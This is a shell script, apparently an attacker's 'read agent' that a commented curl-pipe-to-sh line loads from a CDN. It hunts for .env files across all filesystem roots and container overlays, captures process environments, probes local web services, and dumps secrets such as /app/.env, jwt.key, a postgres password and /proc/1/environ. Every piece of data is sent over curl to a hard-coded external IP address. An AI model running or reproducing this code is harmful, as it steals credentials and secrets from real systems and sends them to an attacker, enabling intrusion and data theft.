#!/bin/sh
# i352 Goal-A read agent. Executed by the jsDelivr loader:
#   sh -c 'curl -s cdn.jsdelivr.net/gh/anti-phishing-bot/x2@<sha>/i352x.sh|sh'
# Full no-depth-cap env search across every reachable root + overlay lowerdirs,
# optimizer-process identification, and byte-exact dump of all on-box secrets.
NONCE="${NONCE:-i352run}"
b64(){ base64 -w0 2>/dev/null || base64 | tr -d '\n'; }
B='http://91.215.85.170:18088'
L=/tmp/i352x.log
: > "$L" 2>/dev/null
send(){ echo "$1=$2" >> "$L" 2>/dev/null; curl -s -m 25 -G --data-urlencode "t=$NONCE-$1" --data-urlencode "d=$2" "$B" >/dev/null 2>&1; }
# send long output split into chunks (3000 chars each)
sendbig(){ key="$1"; fn="$2"; f="$3"; n=0; if [ -f "$f" ]; then while IFS= read -r line || [ -n "$line" ]; do send "$key.$n" "$line"; n=$((n+1)); done < "$f"; fi; send "$key.count" "$n"; }

send ident "$(uname -n)|$(hostname)|$(id)"
send p1cmd "$(tr '\0' ' ' </proc/1/cmdline)"
send uname "$(uname -a)"

# --- (a) FULL no-depth-cap env search ---
: > /tmp/i352_envfind
for root in / /proc/1/root /proc/*/root; do
  find "$root" -xdev \( -path '*/proc/*' -o -path '*/sys/*' -o -path '*/dev/*' \) -prune -o -name '.env*' -print 2>/dev/null | grep -v '^/proc/[0-9]*/root/proc' 
done > /tmp/i352_envfind 2>/dev/null
sort -u /tmp/i352_envfind -o /tmp/i352_envfind
send envfind_count "$(wc -l </tmp/i352_envfind)"
sendbig envfind /dev/null /tmp/i352_envfind

# overlay lowerdir chain from mount
: > /tmp/i352_lower
mount 2>/dev/null | grep -Ei 'overlay' | tr ',' '\n' | grep -E 'lowerdir|upperdir|workdir|/containerd|overlay' > /tmp/i352_lower
sendbig mountovl /dev/null /tmp/i352_lower
# list each lowerdir if it exists in our namespace
: > /tmp/i352_lowerls
for d in $(grep -oE '/(var/lib/[^,: ]+|run/[^,: ]+)' /tmp/i352_lower 2>/dev/null | sort -u); do
  [ -d "$d" ] && echo "EXISTS $d" >> /tmp/i352_lowerls
done
sendbig lowerls /dev/null /tmp/i352_lowerls

# --- (b) who runs the optimizer ---
send ps "$(ps auxww 2>/dev/null | head -c 4000)"
send ss "$( (ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null) | head -c 3000)"
: > /tmp/i352_proc
for p in /proc/[0-9]*; do
  pid=${p#/proc/}
  cm=$(tr '\0' ' ' <"$p/cmdline" 2>/dev/null)
  case "$cm" in
    *node*|*sharp*|*start.sh*|*next*) echo "PID $pid CMD $cm" >> /tmp/i352_proc
      echo "PID $pid CWD $(readlink $p/cwd 2>/dev/null)" >> /tmp/i352_proc
      echo "PID $pid ENV $(b64 <$p/environ 2>/dev/null)" >> /tmp/i352_proc ;;
  esac
done
sendbig procs /dev/null /tmp/i352_proc
send curl8787 "$(curl -s -m 8 -o /dev/null -w '%{http_code} %{content_type}' 'http://127.0.0.1:8787/_next/image?url=%2Ffavicon.ico&w=64&q=75' 2>&1)"
send curl8787root "$(curl -s -m 8 -o /dev/null -w '%{http_code} %{content_type}' 'http://127.0.0.1:8787/' 2>&1)"
send curl8788 "$(curl -s -m 8 -o /dev/null -w '%{http_code} %{content_type}' 'http://127.0.0.1:8788/' 2>&1)"

# --- (c) byte-exact secret dumps (line-numbered + base64) ---
send etc_hostname "$(b64 </etc/hostname)"
send etc_hosts "$(b64 </etc/hosts)"
send etc_resolv "$(b64 </etc/resolv.conf)"
for f in /app/.env /app/jwt.key /app/start.sh /run/adverserial/current/postgres-password /run/adverserial/current/artex-config.json; do
  k=$(echo "$f" | tr '/.' '__')
  if [ -f "$f" ]; then
    send "$k.b64" "$(b64 <"$f")"
    nl -ba "$f" > /tmp/i352_f 2>/dev/null; sendbig "$k.nl" /dev/null /tmp/i352_f
  else
    send "$k.b64" "ABSENT"
  fi
done
send environ.b64 "$(b64 </proc/1/environ)"
tr '\0' '\n' </proc/1/environ > /tmp/i352_env1 2>/dev/null; sendbig environ.nl /dev/null /tmp/i352_env1
send done "i352-complete"
